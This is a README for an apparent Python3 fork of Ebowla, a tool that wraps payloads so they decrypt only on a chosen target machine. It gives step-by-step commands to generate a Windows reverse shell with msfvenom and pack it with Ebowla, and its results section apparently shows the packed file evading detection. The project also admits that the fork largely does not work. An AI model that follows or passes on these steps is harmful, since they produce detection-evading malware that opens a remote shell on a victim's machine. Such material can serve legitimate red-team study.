# Ebowla Fork to add Python3 Support
## project is currently ongoing, so obviously not everything works (honestly nothing really works)

buuuuuut if the output type is set to GO in the generic config, all compatible payload types will work (we think... maybe)

# ABOUT EBOWLA AND HOW TO USE IT
## framework for building environmental keyed payloads

### Get EBOWLA

```git clone https://github.com/Genetic-Malware/Ebowla```

```cd Ebowla```

### edit generic.config:

change:

output_type = GO

payload_type = EXE

Set at least one environment variable (computername = hostname),
the name has to be exact, as Ebowla won't decrypt otherwise.

### make payload

Make, as an example, a reverse shell payload with metersploit: 

```msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -a x64 -o shell.exe```

### build executable with Ebowla

```python2 ebowla.py shell.exe genetic.config```

![](https://raw.githubusercontent.com/ohoph/cheatsheats/master/ebowla/images/2019-12-13_09-42.png?token=ANDZTD52FKYQIOMKV3RBKUC56NLDI)

```./build_x64_go.sh output/<outputfilefromfirststeps> <finalfilename>```

![](https://raw.githubusercontent.com/ohoph/cheatsheats/master/ebowla/images/2019-12-13_09-47.png?token=ANDZTDZ4WQD7BAUW45VQUWK56NLHO)

The finished, packed executable can be found in the **output** folder.

### Results!

### without Ebowla

![](https://raw.githubusercontent.com/ohoph/cheatsheats/master/ebowla/images/2019-12-13_09-50.png?token=ANDZTD3RLAGGH5XC3FN3A2S56NLMI)

### same executable with the use of Ebowla

![](https://raw.githubusercontent.com/ohoph/cheatsheats/master/ebowla/images/2019-12-13_09-52.png?token=ANDZTD3BMQF7CAHDMEHEVZC56NLMQ)
